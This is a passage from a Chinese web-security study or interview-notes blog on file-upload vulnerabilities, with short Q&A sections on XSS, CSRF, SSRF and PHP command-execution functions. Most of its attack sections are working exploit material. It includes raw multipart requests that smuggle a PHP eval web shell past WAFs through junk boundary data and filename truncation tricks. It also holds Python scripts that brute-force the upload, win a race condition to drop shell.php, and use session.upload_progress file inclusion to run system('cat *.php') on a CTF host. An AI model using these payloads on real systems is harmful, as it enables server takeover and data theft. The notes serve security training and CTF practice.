+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /Pass-01/index.php HTTP/1.1</span><br><span class="line">Host: hackrock.com:813</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzEHC1GyG8wYOH1rf,bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 592</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryzEHC1GyG8wYOH1rf</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&#x27;x&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryzEHC1GyG8wYOH1rf</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------WebKitFormBoundaryzEHC1GyG8wYOH1rf--</span><br></pre></td></tr></table></figure>
+
+<h4 id="multipart-x2F-form-data与boundary之间插入垃圾数据"><a href="#multipart-x2F-form-data与boundary之间插入垃圾数据" class="headerlink" title="multipart&#x2F;form-data与boundary之间插入垃圾数据"></a>multipart&#x2F;form-data与boundary之间插入垃圾数据</h4><p>刚才讲到过multipart&#x2F;form-data与boundary之间可以插入任何数据,那么就可以在multipart&#x2F;form-data与boundary之间加入大量垃圾数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /Pass-01/index.php HTTP/1.1</span><br><span class="line">Host: hackrock.com:813</span><br><span class="line">Content-Type: multipart/form-data bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9boundary=----WebKitFormBoundaryzEHC1GyG8wYOH1rf</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 319</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryzEHC1GyG8wYOH1rf</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&#x27;x&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryzEHC1GyG8wYOH1rf</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------WebKitFormBoundaryzEHC1GyG8wYOH1rf--</span><br></pre></td></tr></table></figure>
+
+<h3 id="数据截断"><a href="#数据截断" class="headerlink" title="数据截断"></a>数据截断</h3><h4 id="回车换行截断"><a href="#回车换行截断" class="headerlink" title="回车换行截断"></a>回车换行截断</h4><p>POST请求头的值（不是请求头）是可以换行的,但是中间不得有空行。若WAF匹配文件名到换行截止,则可以绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: for</span><br><span class="line">m-data; name=&quot;upload_</span><br><span class="line">file&quot;; fi</span><br><span class="line">le</span><br><span class="line">name=&quot;sh</span><br><span class="line">ell.p</span><br><span class="line">h</span><br><span class="line">p&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="分号截断"><a href="#分号截断" class="headerlink" title="分号截断"></a>分号截断</h4><p>若WAF匹配文件名到分号截止,则可以绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.jpg;.php&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="引号截断"><a href="#引号截断" class="headerlink" title="引号截断"></a>引号截断</h4><p>php&lt;5.3 单双引号截断特性</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.jpg&#x27;.php&quot;</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.jpg&quot;.php&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h4><p>在url中%00表示ascll码中的0 ,而ascii中0作为特殊字符保留,所以当url中出现%00时就会认为读取已结束。这里使用[0x00]代替16进制的00字符</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php[0x00].jpg&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># _*_  coding:utf-8 _*_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://hackrock.com:813/Pass-01/index.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_str</span>(<span class="params">randomlength=<span class="number">16</span></span>):</span><br><span class="line">    random_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    base_str = <span class="string">&#x27;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line">    length = <span class="built_in">len</span>(base_str) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(randomlength):</span><br><span class="line">        random_str += base_str[random.randint(<span class="number">0</span>, length)]</span><br><span class="line">    <span class="keyword">return</span> random_str</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>,<span class="number">8000</span>,<span class="number">50</span>):</span><br><span class="line">    stri = generate_random_str(i)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;Host&quot;</span>:<span class="string">&quot;hackrock.com:813&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Referer&quot;</span>:<span class="string">&quot;http://hackrock.com:813/Pass-01/index.php&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;multipart/form-data; boundary=----&quot;</span> + stri</span><br><span class="line">        &#125;</span><br><span class="line">        payload = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            ------&quot;&quot;&quot;</span> + stri +<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php&quot;</span></span><br><span class="line"><span class="string">            Content-Type: image/png</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;?php @eval($_POST[&#x27;hack&#x27;]); ?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            ------&quot;&quot;&quot;</span> + stri + <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            上传</span></span><br><span class="line"><span class="string">            ------&quot;&quot;&quot;</span> + stri + <span class="string">&quot;&quot;&quot;--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        response=requests.post(url=url,headers=headers,data=payload,timeout=<span class="number">0.5</span>)</span><br><span class="line">        result = response.content</span><br><span class="line">        <span class="built_in">print</span> result</span><br><span class="line">        <span class="built_in">print</span> stri</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;\n&quot;</span></span><br><span class="line">        <span class="comment">#print payload</span></span><br><span class="line">        <span class="comment">#print headers</span></span><br><span class="line">        <span class="keyword">if</span> result.count(<span class="string">&#x27;上传&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Length is : %s &quot;</span> % <span class="built_in">str</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;.&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1944142">https://cloud.tencent.com/developer/article/1944142</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/89132768">https://zhuanlan.zhihu.com/p/89132768</a>)</p>
+<h1 id="为什么会存在文件上传漏洞？"><a href="#为什么会存在文件上传漏洞？" class="headerlink" title="为什么会存在文件上传漏洞？"></a>为什么会存在文件上传漏洞？</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>文件上传漏洞是指用户上传了一个可执行的脚本文件,并通过此脚本文件获取到了执行服务器端命令的能力.这种攻击凡是是最为直接和有效的,文件上传本身没有什么问题,有问题的是文件上传后,服务器端如何去处理,解释文件,如果服务器的处理逻辑做的不够安全,则会导致严重的后果</p>
+<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ol>
+<li>上传的文件是web脚本语言,服务器的web容器解释并执行了用户上传脚本,导致代码执行</li>
+<li>上传文件是木马或者病毒.主要用于诱骗用户或者管理员下载执行或者直接自动运行</li>
+<li>上传文件是flash的执行策略文件crossdomain.xml.黑客用以控制flash在该域下的行为(其他通过类似的凡是控制策略文件的情况类似)</li>
+</ol>
+<h2 id="上传漏洞满足条件"><a href="#上传漏洞满足条件" class="headerlink" title="上传漏洞满足条件"></a>上传漏洞满足条件</h2><p>首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/279171.html">https://www.freebuf.com/vuls/279171.html</a></p>
+<h1 id="什么时候可以用条件竞争"><a href="#什么时候可以用条件竞争" class="headerlink" title="什么时候可以用条件竞争"></a>什么时候可以用条件竞争</h1><h2 id="上传后删除"><a href="#上传后删除" class="headerlink" title="上传后删除"></a>上传后删除</h2><p>原理简单,之间上代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$filename</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$filename</span>,<span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);   <span class="comment">#后缀</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span> = <span class="string">&#x27;uploads/&#x27;</span> . <span class="variable">$filename</span>;</span><br><span class="line"><span class="variable">$tmp</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp</span>, <span class="variable">$path</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php/i&#x27;</span>, <span class="variable">$ext</span>))&#123;   <span class="comment">#判断后缀是否为php</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;upload success,file in &#x27;</span>.<span class="variable">$path</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$path</span>);    <span class="comment">#已经上传后判断若是PHP则删除</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;can&#x27;t upload php file!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;upload error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220607152228809.png" alt="image-20220607152228809"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">td</span>(<span class="params"><span class="built_in">list</span></span>):</span><br><span class="line">    url = <span class="string">&#x27;http://wan/&#x27;</span></span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: (</span><br><span class="line">        <span class="string">&#x27;wan.php&#x27;</span>, <span class="string">&quot;&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php phpinfo();?&gt;&#x27;);?&gt;&quot;</span>)&#125;</span><br><span class="line">    r = requests.post(url=url +<span class="string">&quot;server.php&quot;</span>,  files=files)</span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    req = requests.get(url + <span class="string">&quot;uploads/wan.php&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> req.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;上传成功&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(<span class="number">20</span>) <span class="keyword">as</span> p:</span><br><span class="line">        p.<span class="built_in">map</span>(td, <span class="built_in">range</span>(<span class="number">200</span>))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220607154403330.png" alt="image-20220607154403330"></p>
+<h2 id="利用php-session-upload-progress进行文件包含"><a href="#利用php-session-upload-progress进行文件包含" class="headerlink" title="利用php _session_upload_progress进行文件包含"></a>利用php _session_upload_progress进行文件包含</h2><p>可以利用session.upload_progress进行文件包含,在php5.4之后添加了这个功能</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220607155439248.png" alt="image-20220607155439248"></p>
+<p>php的几个默认配置</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#表示upload_progress功能开始,也意味着当浏览器向服务器上传一个文件是,php会把此次文件上传的详细信息(如上传时间 上传进度等)存储在session当中</span><br><span class="line"></span><br><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line">#表示当文件上传结束后,php将会立即清除对应session文件中的内容,这个选项非常重要</span><br><span class="line"></span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line">#prefix+name将表示为session中的键名</span><br><span class="line"></span><br><span class="line">3. session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">#name当它出现在表单中,php将会报告上传进度,最大的好处是他的值可控</span><br><span class="line"></span><br><span class="line">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">#表示为session中的键名</span><br><span class="line"></span><br><span class="line">5. session.upload_progress.freq = &quot;1%&quot;</span><br><span class="line"></span><br><span class="line">6. session.upload_progress.min_freq = &quot;1&quot;</span><br><span class="line"></span><br><span class="line">7.session.use_strict_mode=off</span><br><span class="line">#增配置的默认值为off,表示我们对cookie中的sessionid可控</span><br></pre></td></tr></table></figure>
+
+<p>我们来看一下这两个.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">7.session.use_strict_mode=off</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// PHPSESSION = Sn0w</span><br><span class="line">&lt;form action=&quot;upload.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line"> &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</span><br><span class="line"> &lt;input type=&quot;file&quot; name=&quot;file1&quot; /&gt;</span><br><span class="line"> &lt;input type=&quot;file&quot; name=&quot;file2&quot; /&gt;</span><br><span class="line"> &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220607160354031.png" alt="image-20220607160354031"></p>
+<p>php中的session中的内容并不是存储在内存中,而是以文件的方式进行存储,存储方式是有配置项session.save_handler来进行确定的,默认便是以文件进行存储,存储文件的名字便是有sess_sessionid来进行命名的,文件的内容便是session值序列化之后的内容,至于存储路径便是由配置项session.save_path来进行决定的.</p>
+<p>一般session存储的路径都不会去更改,默认便是.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">linux:</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sessions/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br><span class="line"></span><br><span class="line">Windows:</span><br><span class="line">C:\WINDOWS\Temp</span><br></pre></td></tr></table></figure>
+
+<p>默认的存储路径知道了,但是还有一个问题,就是代码中没有session_start()函数,怎么创建出session文件呢?其实如果配置项session.auto_start&#x3D;On 是打开的,那么php在接收请求的时候就会自动化session,不在需要执行该函数,但是默认都是关闭的,在session中还有一个默认选项,便是上面的session.use_strict_mode&#x3D;0默认值off,用户可以自己定义sessionid.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie中设置:</span><br><span class="line">PHPSESSID=123</span><br><span class="line">PHP便会在服务器上创建一个文件(默认路径)</span><br><span class="line">/tmp/sess_123</span><br></pre></td></tr></table></figure>
+
+<p>即使此时用户没有初始化session,php也会自动初始化session,并产生一个键值,这个键值由ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成,最后被写入sess_文件里。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://40902305-6448-4874-b65d-79adb550fd6d.chall.ctf.show/&#x27;</span></span><br><span class="line">sessID = <span class="string">&#x27;Sn0w&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">	<span class="comment">#判断event的标志是否为True</span></span><br><span class="line">	<span class="keyword">while</span> event.isSet():</span><br><span class="line">		<span class="comment">#上传文件要大一点,更有利于条件竞争</span></span><br><span class="line">		f = io.BytesIO(<span class="string">b&#x27;Sn0w&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">		reponse = session.post(</span><br><span class="line">			url,</span><br><span class="line">			cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessID&#125;,</span><br><span class="line">			data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php system(&quot;cat *.php&quot;);?&gt;&#x27;</span>&#125;,</span><br><span class="line">			files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;text.txt&#x27;</span>,f)&#125;</span><br><span class="line">		)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">	<span class="keyword">while</span> event.isSet():</span><br><span class="line">		reponse = session.get(url+ <span class="string">&#x27;?file=/tmp/sess_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(sessID))</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;text&#x27;</span> <span class="keyword">in</span> reponse.text:</span><br><span class="line">			<span class="built_in">print</span>(reponse.text)</span><br><span class="line">			<span class="comment">#将event的标志设置为False,调用wait方法的所有线程将被阻塞；</span></span><br><span class="line">			event.clear()</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;[*]continued&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	<span class="comment">#通过threading.Event()可以创建一个事件管理标志,该标志（event）默认为False</span></span><br><span class="line">	event = threading.Event()</span><br><span class="line">	<span class="comment">#将event的标志设置为True,调用wait方法的所有线程将被唤醒；</span></span><br><span class="line">	event.<span class="built_in">set</span>()</span><br><span class="line">	<span class="comment">#会话机制(Session）在PHP 中用于保持用户连续访问Web应用时的相关数据</span></span><br><span class="line">	<span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">			threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">			threading.Thread(target=read, args=(session,)).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/u5013914/sn0w/blh341#LbWIR">Ctfshow&#x2F;文件包含—web78-88 · 语雀 (yuque.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46150940/article/details/115639419">https://blog.csdn.net/qq_46150940/article/details/115639419</a></p>
+<h1 id="写过目录扫描工具吗"><a href="#写过目录扫描工具吗" class="headerlink" title="写过目录扫描工具吗"></a>写过目录扫描工具吗</h1><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/200890.html">https://www.freebuf.com/sectool/200890.html</a></p>
+<h1 id="不通过状态码判断的方式如何确定是具体文件"><a href="#不通过状态码判断的方式如何确定是具体文件" class="headerlink" title="不通过状态码判断的方式如何确定是具体文件"></a>不通过状态码判断的方式如何确定是具体文件</h1><h2 id="404页面识别思路"><a href="#404页面识别思路" class="headerlink" title="404页面识别思路"></a>404页面识别思路</h2><ol>
+<li>web容器设置404错误页面,服务端返回404状态码.这种情况之下我们可以根据返回的状态码来判断是不是404页面</li>
+<li>将404错误页面指向一个新的页面,页面上显示404信息,但是此时状态码不是404,一般返回状态码有301 302,或者直接返回状态码为200的错误页面.这种情况下我们可以从状态码是否是404来进行判断,或者获取域名的404页面,然后判断请求的页面和404页面是否相似,相似则可以判断404页面</li>
+</ol>
+<h2 id="404页面过滤"><a href="#404页面过滤" class="headerlink" title="404页面过滤"></a>404页面过滤</h2><p>那么第一个问题就是页面的相似度.如何判断这两个页面的相似度呢?可以使用hashes.simhash,对两个页面的body计算hash值,在调用similarity获取两个页面的相似值,自定义一个阈值作为标准判断是否相似,radio可以根据具体请求调整</p>
+<p>构造404页面的时候可以产生一个随机字符串去访问页面,这样一定会是错误页面,但是还要注意的是当你本身的第一个请求都是404的话,就没有后面的事情了.</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4404">https://xz.aliyun.com/t/4404</a></p>
+<h1 id="http-only的作用-有http-only怎么获取cookie"><a href="#http-only的作用-有http-only怎么获取cookie" class="headerlink" title="http only的作用 有http only怎么获取cookie"></a>http only的作用 有http only怎么获取cookie</h1><p>如果在cookie中设置了http only属性,那么将不能从js脚本中获取到cookie的信息,也就是说补鞥呢用document.cookie()来获取cookie</p>
+<ol>
+<li>配置错误,htto only只是对特定的cookie做了保护</li>
+<li>如果apache版本低,可以通过发送超长cookie,可以获取http only保护下的cookie</li>
+</ol>
+<h1 id="XSS除了盗取Cookie还能干嘛？"><a href="#XSS除了盗取Cookie还能干嘛？" class="headerlink" title="XSS除了盗取Cookie还能干嘛？"></a>XSS除了盗取Cookie还能干嘛？</h1><p>常规用到的就是盗取cookie js做钓鱼工具 流量指向等.主要作用是盗取管理员的凭证,就意味着得到后台的权限,可以直接利用.还能配合别的漏洞,比如可以和网站木马结合,扔到哪里去跳转</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/276998.html">https://www.freebuf.com/articles/web/276998.html</a></p>
+<h1 id="XSS防御？CSP怎么绕？"><a href="#XSS防御？CSP怎么绕？" class="headerlink" title="XSS防御？CSP怎么绕？"></a>XSS防御？CSP怎么绕？</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5084">https://xz.aliyun.com/t/5084</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2179">https://xz.aliyun.com/t/2179</a></p>
+<h1 id="xss和csrf区别"><a href="#xss和csrf区别" class="headerlink" title="xss和csrf区别"></a>xss和csrf区别</h1><ol>
+<li>xss是单一网站不需要登录就能获取cookie,csrf是有一个漏洞网站,和一个攻击网站需要先登录漏洞网站</li>
+<li>xss是向网站注入js代码,执行js代码.csrf利用网站本身漏洞去执行网站功能</li>
+</ol>
+<h1 id="SSRF有哪些利用点？"><a href="#SSRF有哪些利用点？" class="headerlink" title="SSRF有哪些利用点？"></a>SSRF有哪些利用点？</h1><h2 id="ssrf寻找"><a href="#ssrf寻找" class="headerlink" title="ssrf寻找"></a>ssrf寻找</h2><ol>
+<li>分享:通过url地址分享网页内容</li>
+<li>转码服务: 通过url地址把原地址的网页内容调优使其适合收集屏幕浏览</li>
+<li>在线翻译 : 他弄个url地址翻译对应文本的内容,比如百度翻译,有道等</li>
+<li>图片加载与下载: 通过指定url地址加载或者下载图片</li>
+<li>图片文章的收藏功能:从分享的url中读取原文的标题等</li>
+<li>从未公开的api实现以及其他调用url的功能</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11215">https://xz.aliyun.com/t/11215</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/346220565">https://zhuanlan.zhihu.com/p/346220565</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.buaq.net/go-66428.html">https://www.buaq.net/go-66428.html</a></p>
+<h1 id="SSRF的IP绕过？"><a href="#SSRF的IP绕过？" class="headerlink" title="SSRF的IP绕过？"></a>SSRF的IP绕过？</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39101049/article/details/102501839">https://blog.csdn.net/qq_39101049/article/details/102501839</a></p>
+<h1 id="PHP命令执行函数有了解吗？有哪些？"><a href="#PHP命令执行函数有了解吗？有哪些？" class="headerlink" title="PHP命令执行函数有了解吗？有哪些？"></a>PHP命令执行函数有了解吗？有哪些？</h1><p><strong>eval()</strong></p>
+<p><strong>assert</strong></p>
+<p><strong>preg_replace()</strong></p>
+<p><strong>create_function()</strong></p>
+<p><strong>array_map()</strong></p>
+<p><strong>call_user_func()</strong></p>
+<p><strong>call_user_func_array()</strong></p>
+<p><strong>array_filter()</strong></p>
+<p>….</p>
+<p><a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/code-audit/php-code-audit.html">https://wiki.wgpsec.org/knowledge/code-audit/php-code-audit.html</a></p>
+<h1 id="php-rce函数"><a href="#php-rce函数" class="headerlink" title="php rce函数"></a>php rce函数</h1><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/261910#h3-4">https://www.anquanke.com/post/id/261910#h3-4</a></p>
+<h1 id="eval与system区别"><a href="#eval与system区别" class="headerlink" title="eval与system区别"></a>eval与system区别</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43376075/article/details/105189017">https://blog.csdn.net/weixin_43376075/article/details/105189017</a></p>
